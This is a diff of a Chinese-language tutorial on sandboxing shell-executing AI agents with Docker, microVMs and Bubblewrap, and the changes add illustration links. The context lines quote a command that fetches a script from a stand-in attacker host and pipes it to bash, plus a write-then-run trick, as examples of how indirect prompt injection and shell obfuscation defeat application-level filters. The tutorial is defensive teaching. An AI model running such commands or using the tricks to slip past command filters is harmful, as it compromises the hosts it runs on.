@@ -10,6 +10,11 @@ series: "Pi Agent 通才教程"
 
 **TL;DR：** 将一个能够执行 Shell 命令的 Agent 部署到生产环境或云端多租户服务中，就像把服务器的 root 权限交给了一个不可预测的外部函数。许多团队试图在应用层使用正则或 LLM-as-Judge 来做“安全防护”，但在间接提示词注入（Indirect Prompt Injection）与复杂的 Shell 语法混淆面前，应用层防护形同虚设。**真正的生产安全必须建立在操作系统与硬件级虚拟化隔离之上**。本文作为《Pi Agent 实战通才教程》第八课，带你实现基于 `BashOperations` 抽象的可插拔沙箱驱动，接入 **Docker 容器**、**Gondolin 微虚拟机（MicroVM）** 与 **Linux Bubblewrap**，并手写支持**进程树强杀（Tree-Kill）**与 **50KB 滚动缓冲**的高鲁棒性执行器。
 
+
+---
+
+![物理沙箱与生产安全：BashOperations、微虚拟机与提示词注入防御](../../../public/images/pi-sandbox-security-microvm-prompt-injection.svg)
+
 ## 一、为什么应用层防护必定被突破？
 
 理解 Agent 安全的第一原则是：**永远不要相信 LLM 的意图，永远不要在未隔离的宿主环境中执行未知的 Agent 命令。**
@@ -35,6 +40,10 @@ curl -s http://attacker.com/malicious.sh | bash
 - 动态写文件并执行：`echo 'dangerous_code' > /tmp/x && sh /tmp/x`
 
 因此，**应用层只负责交互辅助，物理隔离必须下沉给操作系统沙箱**。
+
+
+
+![Pi 沙箱架构对比：Bubblewrap (单机极速 5ms) vs Docker (云端高强隔离)](../../../public/images/pi-tutorial-sandbox-bwrap-docker-comparison.svg)
 
 ## 二、BashOperations：把系统调用收敛在接口之后
 
@@ -158,6 +167,10 @@ export class LocalBashDriver {
   }
 }
 ```
+
+
+
+![Pi 命令白名单与黑名单 AST 正则双重审查模型](../../../public/images/pi-tutorial-security-command-allowlist-denylist.svg)
 
 ## 四、动手实战 2：Docker 容器沙箱驱动实现
 
